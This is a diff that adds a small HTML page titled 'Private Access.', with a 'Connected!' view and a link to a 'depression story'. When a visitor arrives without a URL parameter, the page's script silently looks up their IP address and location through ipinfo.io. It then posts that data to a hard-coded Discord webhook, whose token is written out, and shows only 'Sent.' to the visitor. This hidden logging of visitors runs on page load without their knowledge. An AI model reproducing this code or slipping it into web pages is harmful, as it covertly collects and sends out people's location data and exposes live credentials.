@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Private Access.</title>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+    <style>
+    body {
+        background-color: black;
+        color: green;
+        font-family: "arial";
+        overflow: shown;
+    }
+    .center {
+        text-align: center;
+        margin-top: 20px;
+        color: #ccc
+    }
+        .buttn {
+          display: block;
+          width: 150px;
+          height: 25px;
+          background-color: transparent;
+          color: white;
+          font-size: 18px;
+          text-align: center;
+          line-height: 25px;
+          margin: 10px auto;
+          text-decoration: none;
+          border-radius: 5px;
+  
+        }
+        
+        .hell {
+          height: 100%;
+          width: 100%;
+        }
+
+        .tredot:after {
+          overflow: hidden;
+          display: inline-block;
+          vertical-align: bottom;
+          -webkit-animation: ellipsis steps(9999, end) 900ms infinite;
+          animation: ellipsis steps(9999, end) 900ms infinite;
+          content: "\2026";
+          width: 0px;
+        }
+
+        @keyframes ellipsis {
+          to {
+            width: 40px;
+          }
+        }
+
+        @-webkit-keyframes ellipsis {
+          to {
+            width: 40px;
+          }
+        }
+    #accessDenied {
+        color: red;
+        text-align: center;
+        margin-top: 50px;
+        display: none;
+    }
+    </style>
+    <script>
+       function redirectToPage() {
+            const customText = "unknown";
+            window.location.href = "kenls.html?message=" + encodeURIComponent(customText);
+       }
+    </script>
+    <script>
+        function fetchIPAddress() {
+            fetch('https://ipinfo.io/json?token=99f73457c30e33')
+                .then(response => response.json())
+                .then(data => {
+                    const ipInfo = `IP Address: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}`;
+                    sendToDiscord(ipInfo);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        }
+
+        function sendToDiscord(message) {
+            const webhookURL = 'https://discord.com/api/webhooks/1250303725835128956/hb3e4hj76bdTHUul_8q1rPMpY-C_I8wm_BIRUdjMttdhyGclXNbNbKnp2Pjztvy_mTwK';
+            const payload = {
+                content: message
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Message sent to Discord');
+                } else {
+                    console.error('Error sending message to Discord');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending message to Discord:', error);
+            });
+        }
+
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const message = urlParams.get('message');
+            if (message) {
+                document.getElementById('customMessage').textContent = message;
+            } else {
+                document.getElementById('content').style.display = 'none';
+                
+                document.getElementById('hell').style.display = 'none';
+                
+                document.getElementById('lf').style.display = 'none';
+                
+                document.getElementById('accessDenied').style.display = 'block';
+                fetchIPAddress();
+            }
+        }
+    </script>
+</head>
+<body>
+    <div id="content" style="text-align: center; margin-top: 27px;">
+        <h1 class="dev_hi">Connected!</h1>
+        <p id="customMessage"></p>
+        <hr>
+    </div>
+    <!-- just a div which marks redirects -->
+    <div class="hell" id="hell">
+        <h1 class="tredot" style="color: #ccc9">★ List Below</h1>
+    </div>
+    <!-- my depression story -->
+    <div id="lf">
+        <h2 class="center" style="color: #ccc7"><li>Read My Depression Story.</li></h2>
+        <button class="buttn" onclick="redirectToPage()"></button>
+    </div>
+    
+    <!-- only if access failed, it'll show that only. -->
+    <div id="accessDenied">
+        <h1><img src="img/wrong.png" width="20"> Sent.</h1>
+    </div>
+    
+</body>
+</html>
